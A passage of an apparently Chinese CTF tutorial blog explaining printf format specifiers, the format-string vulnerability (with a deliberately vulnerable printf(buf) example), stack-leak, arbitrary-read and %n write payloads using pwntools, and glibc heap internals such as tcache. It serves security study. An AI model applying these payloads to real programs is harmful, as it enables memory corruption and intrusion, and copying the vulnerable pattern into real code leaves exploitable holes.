class="string">&quot;%jd\n&quot;</span>, im);</span><br><span class="line">    <span class="comment">// 会输出 &quot;9223372036854775807&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>- <strong>Type</strong>：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>%p</code></td>
<td style="text-align:center">打印指针（十六进制地址）</td>
</tr>
<tr>
<td style="text-align:center"><code>%x</code></td>
<td style="text-align:center">打印十六进制（小写）</td>
</tr>
<tr>
<td style="text-align:center"><code>%s</code></td>
<td style="text-align:center">打印字符串（char*），即打印某个地址里的内容。</td>
</tr>
<tr>
<td style="text-align:center"><code>%.2f</code></td>
<td style="text-align:center">打印浮点数，保留小数点后2位</td>
</tr>
<tr>
<td style="text-align:center"><code>%f</code></td>
<td style="text-align:center">打印浮点数（float/double）</td>
</tr>
<tr>
<td style="text-align:center"><code>%c</code></td>
<td style="text-align:center">打印单个字符（char）</td>
</tr>
<tr>
<td style="text-align:center"><code>%d</code></td>
<td style="text-align:center">打印十进制整数（int）</td>
</tr>
<tr>
<td style="text-align:center"><code>%%</code></td>
<td style="text-align:center">输出一个百分号 %</td>
</tr>
</tbody>
</table>
</div>
<p>其中只有Type是必须要给的，其他均可以省略。</p>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">123</span>;</span><br><span class="line">    <span class="type">float</span> pi = <span class="number">3.14159</span>;</span><br><span class="line">    <span class="type">char</span> letter = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="type">char</span> name[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    <span class="type">int</span> hex = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整数：%d\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数（默认）：%f\n&quot;</span>, pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;浮点数（保留两位）：%.2f\n&quot;</span>, pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符串：%s\n&quot;</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;字符：%c\n&quot;</span>, letter);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;十六进制：%x\n&quot;</span>, hex);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;百分号：%%\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。</p>
<p>此外还有一个比较特殊的格式符：<code>%n</code> 。这个格式符会让 <code>printf</code> 把当前已经打印的字符数量写入n。（或者说写入给定的地址。）</p>
<p>比如说下面这个例子（正常用法）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello%n&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>n的值会被存储为5。</p>
<p>由于它的特殊性以及危险性，很多现代系统在libc中禁用了 <code>%n</code>，或者在格式化函数上增加了保护（如glibc中对 <code>%n</code> 的格式检查）。</p>
<p>不过正是因为它的危险性所以我们在pwn里经常会用它来修改内存数据</p>
<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h4><p>希望输出的变量。</p>
<h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a><strong>格式化字符串漏洞</strong></h3><p><strong>正常情况</strong>：<br>在进入<code>printf</code>函数之后，函数会首先获取第一个参数，一个一个读取其字符会遇到两种情况</p>
<ul>
<li>当前字符不是<code>%</code>，直接输出到相应标准输出。</li>
<li>当前字符是<code>%</code>， 继续读取下一个字符<ul>
<li>如果没有字符，报错</li>
<li>如果下一个字符是<code>%</code>, 输出<code>%</code></li>
<li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li>
</ul>
</li>
</ul>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">3.14f</span>;   <span class="comment">// 注意：传入变参会被“默认实参提升”为 double</span></span><br><span class="line">    <span class="type">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Int: %d, Float: %f, String: %s\n&quot;</span>, a, b, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="参数是怎么传进-printf-的（32-bit-和-64-bit）"><a href="#参数是怎么传进-printf-的（32-bit-和-64-bit）" class="headerlink" title="参数是怎么传进 printf 的（32-bit 和 64-bit）"></a><strong>参数是怎么传进 <code>printf</code> 的（32-bit 和 64-bit）</strong></h4><h5 id="32-bit（cdecl）——全部走栈"><a href="#32-bit（cdecl）——全部走栈" class="headerlink" title="32-bit（cdecl）——全部走栈"></a><strong>32-bit（cdecl）——全部走栈</strong></h5><ul>
<li>变参有“<strong>默认实参提升（default argument promotions）</strong>”：<code>float</code> 会提升为 <code>double</code>（占 8 字节），<code>char/short</code> 提升为 <code>int</code>。</li>
<li>典型调用时<strong>栈</strong>的示意（自上而下是低地址 → 高地址，或按“调用现场从下往上”理解也可以）：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------------------+</span><br><span class="line">| 返回地址（printf 结束后跳转）  |</span><br><span class="line">+------------------------------+</span><br><span class="line">| 格式字符串地址                | --&gt; &quot;Int: %d, Float: %f, String: %s\n&quot;</span><br><span class="line">+------------------------------+</span><br><span class="line">| 参数3（str，4B）              | --&gt; 指向 &quot;hello&quot;</span><br><span class="line">+------------------------------+</span><br><span class="line">| 参数2（b，double，8B）        | --&gt; 3.14（已提升）</span><br><span class="line">+------------------------------+</span><br><span class="line">| 参数1（a，4B）                | --&gt; 10</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure>
<p><code>printf</code> 在解析到 <code>%d/%f/%s</code> 时，会从“第一个可变参数槽位”开始，依次取“4B/8B/指针”的值并格式化输出。</p>
<h5 id="x86-64（System-V-ABI）——寄存器优先-溢出到栈"><a href="#x86-64（System-V-ABI）——寄存器优先-溢出到栈" class="headerlink" title="x86-64（System V ABI）——寄存器优先 + 溢出到栈"></a><strong>x86-64（System V ABI）——寄存器优先 + 溢出到栈</strong></h5><ul>
<li>前 6 个<strong>整数/指针类</strong>参数：<code>RDI, RSI, RDX, RCX, R8, R9</code></li>
<li>前 8 个<strong>浮点类</strong>参数：<code>XMM0–XMM7</code>（<code>float</code> 仍提升为 <code>double</code>）</li>
<li><strong>变参函数</strong>还会准备一个<strong>寄存器保存区（register save area）</strong>和<strong>栈溢出区（overflow area）</strong>。<code>va_list/va_arg</code> 会按<strong>参数类型</strong>从对应区域<strong>顺序取值</strong>；寄存器名额用完后改从栈上取。</li>
</ul>
<p>对应上面的例子，调用瞬间常见分配为：</p>
<ul>
<li><code>RDI</code> = <code>&quot;Int: %d, Float: %f, String: %s\n&quot;</code>（格式串）</li>
<li><code>RSI</code> = <code>a</code>（<code>%d</code>）</li>
<li><code>XMM0</code> = <code>b</code> 的 double（<code>%f</code>）</li>
<li><code>RDX</code> = <code>str</code>（<code>%s</code>）</li>
</ul>
<p>在64-bit架构下不是所有参数都在栈上。<code>printf</code> 通过 <code>va_list</code> 维护“当前吃到第几个槽位”，按类型<strong>先从寄存器保存区拿，超出再从栈拿</strong>；这就是为什么64-bit 下偏移（offset）和 32-bit 不同，必须现场探测或用 <code>%n$</code> 显式参数序号。</p>
<h4 id="特殊情况以及偏差值"><a href="#特殊情况以及偏差值" class="headerlink" title="特殊情况以及偏差值"></a><strong>特殊情况以及偏差值</strong></h4><p>当我们在使用格式化字符串函数但<strong>未提供后续实参</strong>（即只给了 <code>fmt</code> 一个参数）时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello %x %x %x %x&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>printf</code> 在扫描到每个转换说明（<code>%...</code>）时，会依据 ABI 约定通过 <code>va_arg</code> <strong>按顺序</strong>从<strong>可变参数起始位置</strong>检索下一参数槽位的内容：在 <strong>x86（32-bit）</strong> 上对应为<strong>栈槽</strong>，在 <strong>x86-64 SysV</strong> 上对应为<strong>寄存器保存区（reg_save_area）</strong>以及<strong>栈溢出区（overflow_arg_area）</strong>。</p>
<p>由于这些槽位<strong>未被显式赋值</strong>，读取到的将是相应存储区域中的现存（残存）/未定义数据，于是被按 <code>%x/%p/%s</code> 等格式解释并输出。进一步地，当该顺序读取过程推进到<strong>包含本次输入缓冲区</strong>（例如位于栈、堆或 <code>.bss</code>）的地址范围，且<strong>首次</strong>取到我们预置的标记（如 <code>AAAA...</code>）时，<strong>该标记对应的参数序号</strong>就称为<strong>偏差值 <code>k</code></strong>（即从“第一个可变参数槽位”开始计数，到首次命中标记之间的槽位数量）。这样一来，我们即可使用显式参数序号（如 <code>%k$p</code>, <code>%k$s</code>, <code>%k$n</code>）<strong>稳定地指向</strong>目标槽位进行泄露或写入。</p>
<h4 id="漏洞表现"><a href="#漏洞表现" class="headerlink" title="漏洞表现"></a><strong>漏洞表现</strong></h4><p>在CTF的题目里这个漏洞一般的表现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    fgets(buf, <span class="keyword">sizeof</span>(buf), <span class="built_in">stdin</span>); </span><br><span class="line">    <span class="built_in">printf</span>(buf);  <span class="comment">// 会将我们的输入直接当成格式字符串并处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以利用这个漏洞读取栈上的内容（如变量值、返回地址等）或者通过 <code>%n</code> 格式符（就是我们之前提到的那个危险的格式符）向指定内存地址写入数据。</p>
<h3 id="Exploit技巧"><a href="#Exploit技巧" class="headerlink" title="Exploit技巧"></a><strong>Exploit技巧</strong></h3><h4 id="读取栈上的内容"><a href="#读取栈上的内容" class="headerlink" title="读取栈上的内容"></a><strong>读取栈上的内容</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %x&quot;</span>);</span><br><span class="line"><span class="comment">// bffff5c4 80484f0 1</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p %p %p&quot;</span>);</span><br><span class="line"><span class="comment">// 0xbffff5c4 0x80484f0 0x1</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>%x</code> ：以<strong>十六进制整数形式</strong>输出栈上的内容。</li>
<li><code>%p</code> ：以<strong>指针形式</strong>（十六进制地址）输出栈上的内容。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;%p &quot;</span> * <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%x &quot;</span> * <span class="number">40</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251110100216475.png" class="lazyload" data-srcset="/images/image-20251110100216475.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251110100216475"></p>
<p>或者也可以使用<code>%n$p</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot; &quot;</span>.join([<span class="string">f&quot;%<span class="subst">&#123;i&#125;</span>$p&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">61</span>)]).encode()</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251110100300562.png" class="lazyload" data-srcset="/images/image-20251110100300562.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251110100300562"></p>
<h4 id="读取任意地址的字符串"><a href="#读取任意地址的字符串" class="headerlink" title="读取任意地址的字符串"></a><strong>读取任意地址的字符串</strong></h4><ul>
<li><code>%s</code>：把 <strong>栈上的值当成一个指针地址</strong>，并尝试打印这个地址指向的内存，直到遇到 <code>\0</code>。</li>
</ul>
<p>假设栈上某个参数的值是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08049000   →   指向 &quot;HelloWorld&quot;</span><br></pre></td></tr></table></figure>
<p>用 <code>%x</code>和<code>%p</code>会输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8049000</span><br><span class="line">0x8049000</span><br></pre></td></tr></table></figure>
<p>用<code>%s</code>则会输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">HelloWorld</span><br></pre></td></tr></table></figure>
<h5 id="一般流程"><a href="#一般流程" class="headerlink" title="一般流程"></a><strong>一般流程</strong></h5><ol>
<li><p><strong>确定偏移<code>S</code>（offset）</strong>：</p>
<p>输入形如 <code>AAAA,%p,%p,%p...</code> 看第几个 <code>%p</code> 能读出我们可控的标记（比如 <code>0x41414141</code>），得到偏移 <code>S</code>。</p>
</li>
<li><p><strong>使用下面的方法构造payload</strong></p>
</li>
</ol>
<p>假如我们确定了偏移，并且知道了flag的具体地址，那么我们便可以用以下的payload直接读取flag的内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmt_read_addr_payload</span>(<span class="params">offset, addr, k=<span class="number">1</span></span>):</span><br><span class="line">    fmt = <span class="string">f&quot;%<span class="subst">&#123;offset + k&#125;</span>$s&quot;</span>.encode()</span><br><span class="line">    <span class="keyword">return</span> fmt + <span class="string">b&quot;A&quot;</span>*(<span class="number">8</span> * k - <span class="built_in">len</span>(fmt)) + p64(addr)</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<ul>
<li><p>offset是我们确定的偏移</p>
</li>
<li><p>addr是我们希望读取的内容的地址</p>
</li>
<li><p>8*k主要用于对齐。（如果k=1不行，可以尝试k=4，貌似比较稳。）</p>
<p>因为<code>p64(addr)</code> 直接接在格式串后面，如果没有按8字节对齐，它大概率不会正好落在第offset个槽位上，也就会导致读取出问题。</p>
</li>
</ul>
<h4 id="写入"><a href="#写入" class="headerlink" title="写入"></a><strong>写入</strong></h4><h5 id="一般流程-1"><a href="#一般流程-1" class="headerlink" title="一般流程"></a><strong>一般流程</strong></h5><ol>
<li><p><strong>确定偏移 <code>S</code>（offset）</strong>：<br>输入形如 <code>AAAA,%p,%p,%p...</code> 看第几个 <code>%p</code> 能读出我们可控的标记（比如 <code>0x41414141</code>），得到偏移 <code>S</code>。</p>
</li>
<li><p><strong>放置目标地址</strong>（避免<code>\x00</code>截断）：</p>
<ul>
<li>把“<strong>格式化指令（全 ASCII）</strong>”放在前面；</li>
<li>把<strong>目标地址（或一串地址）</strong>放在 payload <strong>末尾</strong>；</li>
<li>用<strong>位置参数</strong><code>%K$...</code> 来点名这些地址（<code>K</code> 从 <code>S + ceil(len(fmt_ascii)/8)</code> 起）。</li>
</ul>
</li>
<li><p><strong>对齐/padding</strong>：</p>
<ul>
<li><p><code>written</code> = 到当前为止<strong>已输出字符数</strong>；</p>
</li>
<li><p>目标值 <code>want</code>（<strong>希望被写入</strong>到内存里的数值，按写入宽度取模）；</p>
</li>
<li><p>计算：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="number">256</span>      <span class="comment">#（%hhn，1字节）</span></span><br><span class="line">base = <span class="number">65536</span>    <span class="comment">#（%hn，2字节）</span></span><br><span class="line">base = <span class="number">2</span>**<span class="number">32</span>    <span class="comment">#（%n，4字节）</span></span><br><span class="line">base = <span class="number">2</span>**<span class="number">64</span>    <span class="comment">#（%ln/%lln，8字节）</span></span><br><span class="line"></span><br><span class="line">pad  = (want - (written % base)) % base</span><br><span class="line"><span class="comment"># 如果 pad == 0，为了稳妥可用 pad = base（等价“加 0”）</span></span><br></pre></td></tr></table></figure>
<p>base为取值范围，分别等于1，2，4，8字节的最大值。</p>
</li>
<li><p>然后输出 <code>%padc</code>（或其他等价方式）把 <code>written</code> 调到想要的值。</p>
</li>
</ul>
</li>
<li><p><strong>执行写入</strong>：</p>
<ul>
<li><code>%K$hhn</code>  写 1 字节</li>
<li><code>%K$hn</code>   写 2 字节</li>
<li><code>%K$n</code>    写 4 字节（<code>int*</code>）</li>
<li><code>%K$ln</code>/<code>%K$lln</code> 写 8 字节（<code>long*</code>/<code>long long*</code>，在 x86_64 都是 8Byte）</li>
</ul>
</li>
</ol>
<p>对 <code>%hn/%n/%ln</code> 这类多字节写，<strong>最好按“从小到大”的目标值</strong>排序写入，避免 padding 需要“回绕”到很大的数。或者直接用<strong>逐字节写</strong> <code>%hhn</code>。</p>
<h5 id="写-1-字节（-hhn）"><a href="#写-1-字节（-hhn）" class="headerlink" title="写 1 字节（%hhn）"></a><strong>写 1 字节（<code>%hhn</code>）</strong></h5><p>示例 1：把 <code>pwnme_addr</code> 的<strong>最低 1 字节</strong>写成 <code>0x90</code></p>
<p>假设已经测得偏移 <code>S = 10</code>，并用<br> <code>BASE = S + ceil(len(fmt_ascii)/8)</code> 计算出第一个地址是第 <code>K=BASE</code> 个参数位。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标：*(uint8_t*)pwnme_addr = 0x90</span></span><br><span class="line"><span class="comment"># 只需让 written % 256 == 0x90 (=144)</span></span><br><span class="line">payload =</span><br><span class="line"><span class="string">b&quot;%144c&quot;</span>      <span class="comment"># written += 144</span></span><br><span class="line"><span class="string">b&quot;%K$hhn&quot;</span>     <span class="comment"># 把 (written%256)=0x90 写进第 K 个参数指向的地址</span></span><br><span class="line">+ p32(pwnme_addr);</span><br></pre></td></tr></table></figure>
<p>若此时 <code>written % 256</code> 不是从 0 开始，照公式算：<br><code>pad = (0x90 - (written%256)) % 256</code>，用 <code>%padc</code> 形成 padding。</p>
<h5 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a><strong>fmtstr_payload</strong></h5><p>Pwntools里有现成的高效构造这种payload的函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>（官方文档：<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/dev/fmtstr.html">https://docs.pwntools.com/en/dev/fmtstr.html</a> ）</p>
<p><strong>参数（摘译）</strong>：</p>
<ul>
<li><code>offset</code>：第一个可控“参数槽”的位置（即你测出来的 <code>%n$p</code> 起点）。</li>
<li><code>writes</code>：要写入的目标，字典 <code>&#123;address: value, ...&#125;</code>。（将value写进address里）</li>
<li><code>numbwritten</code>：调用 <code>printf</code> 前已经输出的字节数（影响对齐/填充计算）。</li>
<li><code>write_size</code>：原子写入粒度，<code>&#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39;</code> 等。</li>
</ul>
<h2 id="堆利用-Heap-Exploitation"><a href="#堆利用-Heap-Exploitation" class="headerlink" title="堆利用/Heap Exploitation"></a><strong>堆利用/Heap Exploitation</strong></h2><p>堆利用（Heap Exploitation）和核心/最终目的是劫持分配器 (Hijacking the Allocator)，让其误以为敏感地址（如 GOT 表、栈上的返回地址、Hook 函数指针）是空闲链表里的一块普通内存，并将其分配给我们，以达到任意写入的目的。当然在此之前还需要信息泄露用于确定我们该往哪里进行写入。</p>
<p>首先先区分一下libc和glibc：</p>
<ul>
<li><p><strong>libc</strong>（C Library）通常指的是<strong>标准 C 库</strong>。它是一套基础函数的<strong>标准规范</strong>。</p>
<p>比如说标准（libc）只规定了<code>malloc</code>和<code>free</code>怎么用。</p>
</li>
<li><p><strong>glibc</strong>（GNU C Library）是 <strong>GNU 项目</strong>对上述 libc 标准的<strong>具体代码实现</strong>。</p>
<p>会决定具体如何管理堆内存（Chunk 结构、Bin 链表、Tcache 机制）。</p>
</li>
</ul>
<p><img src="/images/image-20251127104004619.png" class="lazyload" data-srcset="/images/image-20251127104004619.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127104004619"></p>
<p><strong>Chunk（堆块）结构：</strong> 堆内存被划分为一个个 Chunk。每个 Chunk 包含头部信息（Header）和用户数据区 ：</p>
<ul>
<li><strong>头部字段 (Header)：</strong><ul>
<li><code>prev_size</code>：如果前一个物理相邻的 Chunk 是空闲的，这里存储前一个 Chunk 的大小；如果前一个是使用中的，这里归属于前一个 Chunk 的用户数据区 。</li>
<li><code>size</code>：当前 Chunk 的大小，低 3 位用于存储标志位（如 <code>prev_in_use</code>，表示前一个块是否在使用中） 。</li>
<li><strong>空闲时的指针：</strong> 当 Chunk 被释放（Free）后，用户数据区的前 16 字节会被复用为 <code>fd</code> (Forward Pointer) 和 <code>bw/bk</code> (Backward Pointer)，分别指向链表中的下一个和上一个空闲块 。</li>
</ul>
</li>
<li>内存布局：堆是从低地址向高地址增长的。Chunk 的大小通常以 <code>0x10</code>（16字节）对齐 。</li>
</ul>
<p><strong>堆管理列表 (Bins)：</strong> glibc使用多种链表（Bins）来管理空闲的Chunk，以提高分配效率。常见的几种：</p>
<ul>
<li><strong>Fastbin:</strong><ul>
<li>单向链表 (Singly-linked)，LIFO (后进先出) 。</li>
<li>管理小块内存，大小范围 <code>[0x20, 0x80]</code> 。</li>
<li>每个大小都有独立的链表 。</li>
</ul>
</li>
<li><strong>Tcache (Thread Local Cache):</strong><ul>
<li><strong>最重要特性：</strong> glibc 2.26 引入，为了性能设计，每个线程独有。</li>
<li>单向链表，LIFO 。</li>
<li>大小范围 <code>[0x20, 0x410]</code> 。</li>
<li>分配和释放优先级最高，且默认不进行合并 。</li>
<li>每个链表最多容纳 7 个块 (Count=7) 。</li>
</ul>
</li>
<li><strong>Smallbin:</strong><ul>
<li>双向链表 (Doubly-linked)，FIFO 。</li>
<li>大小范围 <code>[0x20, 0x400]</code> 。</li>
</ul>
</li>
<li><strong>Unsorted Bin:</strong><ul>
<li>双向链表，仅有一个列表 。</li>
<li>作为缓存层，刚释放且未进入 Tcache/Fastbin 的块会先放入这里 。</li>
</ul>
</li>
<li><strong>Top Chunk:</strong> 位于堆顶部的巨大空闲块，当 bins 中没有合适的块时，从这里切割内存 。</li>
</ul>
<p><img src="/images/image-20251127105623146.png" class="lazyload" data-srcset="/images/image-20251127105623146.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20251127105623146"></p>
<p><strong>1. 空闲块的合并机制 (Merging)</strong></p>
<p>glibc 为了防止内存碎片化，通常会尝试把相邻的空闲块合并成一个大块。</p>
<ul>
<li><strong>默认合并对象：</strong><ul>
<li>属于 <strong>双向链表</strong>（Smallbin, Largebin, Unsorted Bin）中的空闲块以及 <strong>Top Chunk</strong> 。</li>
<li>当你释放（free）这些块时，如果它们物理相邻，它们会立即合并。</li>
</ul>
</li>
<li><strong>Fastbin 的特殊情况：</strong><ul>
<li>Fastbin默认<strong>不</strong>合并（为了速度）。</li>
<li><strong>但是</strong>，当程序申请一个较大的内存块（Large Allocation）时，会触发 <code>malloc_consolidate</code> 函数 。</li>
<li>这个函数会清理 Fastbin，强制将里面的块进行合并，放入Unsorted Bin中。</li>
</ul>
</li>
<li><strong>Tcache 的特殊情况：</strong><ul>
<li><strong>Tcache Chunks 永远不会合并</strong> 。</li>
<li>这是Tcache速度极快的原因，也是它的缺点（容易导致堆碎片，但也容易被利用来保留特定大小的空闲块）。</li>
</ul>
</li>
</ul>
<p><strong>2. Tcache 的核心特性 (Regarding tcaches)</strong></p>
<p>Tcache 是 glibc 为了提升多线程性能引入的机制，有几个关键特性：</p>
<ul>
<li><strong>优先级最高 (L1 Cache)：</strong><ul>
<li>它在大多数其他堆逻辑<strong>之前</strong>被填充和提取 。</li>
<li>这意味着：<code>malloc</code> 时先看Tcache有没有；<code>free</code>时先放进Tcache。只有Tcache满了或空了，才会去操作 Fastbin/Smallbin等。</li>
</ul>
</li>
<li><strong>容量限制 (Max-fill of 7)：</strong><ul>
<li>每个大小（Size Class）的链表最多只存 <strong>7 个</strong> Chunk 。</li>
<li>攻击意义： 如果你想把一个块放入Fastbin或Unsorted Bin以触发更复杂的漏洞（如 Unsorted Bin Leak），你需要先<code>free</code>7个同大小的块把Tcache填满，第8个才会落入其他Bin。</li>
</ul>
</li>
<li><strong>管理结构在堆上 (On the heap)：</strong><ul>
<li>Tcache的管理结构（<code>tcache_perthread_struct</code>，存着链表头指针数组）本身也是分配在<strong>堆</strong>上的 。</li>
